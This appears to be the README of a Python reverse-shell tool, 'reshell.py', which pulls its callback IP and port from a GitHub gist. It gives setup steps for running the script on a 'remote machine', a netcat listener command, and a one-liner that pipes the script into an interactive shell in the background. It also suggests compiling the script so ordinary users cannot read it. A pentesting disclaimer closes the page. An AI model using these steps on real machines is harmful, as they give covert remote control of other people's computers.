
# reshell.py
![Python version][python-image]

A python reverse shell

## Configuration
 - Create a github gist with the ip address and the port the script will connect to.
 - open reshell.py go to line 44 and replace url to your gist.
 - run this script on remote machine.

## Connection to shell
    $ ncat -l 3000

     ██▀███  ▓█████   ██████  ██░ ██ ▓█████  ██▓     ██▓
    ▓██ ▒ ██▒▓█   ▀ ▒██    ▒ ▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒
    ▓██ ░▄█ ▒▒███   ░ ▓██▄   ▒██▀▀██░▒███   ▒██░    ▒██░
    ▒██▀▀█▄  ▒▓█  ▄   ▒   ██▒░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░
    ░██▓ ▒██▒░▒████▒▒██████▒▒░▓█▒░██▓░▒████▒░██████▒░██████▒
    ░ ▒▓ ░▒▓░░░ ▒░ ░▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░
    ░▒ ░ ▒░ ░ ░  ░░ ░▒  ░ ░ ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░
    ░░   ░    ░   ░  ░  ░   ░  ░░ ░   ░     ░ ░     ░ ░
    ░        ░  ░      ░   ░  ░  ░   ░  ░    ░  ░    ░  ░

    sectasy@fs:~$

## Running as a background process
    sh -c "./reshell.py | sh -i &" && exit

## Other information
1. You can also compile this script to make it unreadable for regular user or smth.
2. Don't be a dick. This is meant to be used for pentesting or helping coworkers understand why they should always lock their computers. Please don't use this for anything malicious.


[python-image]: https://img.shields.io/badge/python-3.9-blue